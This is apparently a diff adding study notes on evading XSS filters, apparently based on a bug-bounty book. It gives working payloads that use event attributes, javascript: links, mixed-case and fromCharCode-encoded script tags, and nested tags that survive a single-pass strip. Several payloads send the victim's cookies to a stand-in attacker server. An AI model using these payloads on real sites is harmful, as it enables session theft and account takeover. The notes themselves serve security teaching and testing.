@@ -1,0 +1,54 @@
+- Most applications now implement some sort of XSS protection in their input fields. Often, they’ll use a blocklist to filter out dangerous expressions that might be indicative of XSS
+
+-> Alternative JavaScript Syntax : 
+
+- Often, applications will sanitize <script> tags in user input. If that is the case, try executing XSS that doesn’t use a <script> tag. For example, remember that in certain scenarios, you can specify JavaScript to run in other types of tags. When you try to construct an XSS payload, you can also try to insert code into HTML tag names or attributes instead.
+
+- Instead of closing out the image tag and inserting a script tag, like this :
+<img src="/><script>alert('XSS by Vickie');</script>"/>
+
+- you can insert the JavaScript code directly as an attribute to the current tag:
+<img src="123" onerror="alert('XSS by Vickie');"/>
+
+- Another way of injecting code without the <script> tag is to use the special URL schemes mentioned before. This snippet will create a Click me!
+link that will generate an alert box when clicked: <a href="javascript:alert('XSS by Vickie')>Click me!</a>"
+
+-> Capitalization and Encoding : 
+
+- You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string "script", capitalize certain letters in your payload. For example : <scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
+
+- If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly.
+But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the corresponding ASCII characters, to create
+the string you need. For example, this piece of code is equivalent to the string "http://attacker_server_ip/?c=":
+String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
+
+- This means you can construct an XSS payload without quotes, like this:
+<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+
+- You can use this piece of code to translate your exploit string to an ASCII number sequence by using an online JavaScript editor, like https://js.do/, to run the JavaScript code or by saving it into an HTML file and loading it in your browser:
+
+- The ascii() function 1 converts characters to their ASCII numeric representation. We run each character in the input string through ascii() 2.
+Finally, we write the translated string to the document 3. Let’s translate the payload http://attacker_server_ip/?c= by using this code:
+
+<script>
+function ascii(c){
+return c.charCodeAt();
+}
+encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
+document.write(encoded);
+</script>
+
+->Filter Logic Errors : 
+
+- you could exploit any errors in the filter logic. For example, sometimes applications remove all <script> tags in the user input to prevent XSS,
+but do it only once. If that’s the case, you can use a payload like this:
+<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>
+
+- Notice that each <script> tag cuts another <script> tag in two. The filter won’t recognize those broken tags as legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:
+<script>location='http://attacker_server_ip/c='+document.cookie;</script>
+
+- These are just a handful of the filter-bypass techniques, For more filter bypass ideas, check out OWASP’s XSS filter evasion cheat sheet (https://
+owasp.org/www-community/xss-filter-evasion-cheatsheet).
+
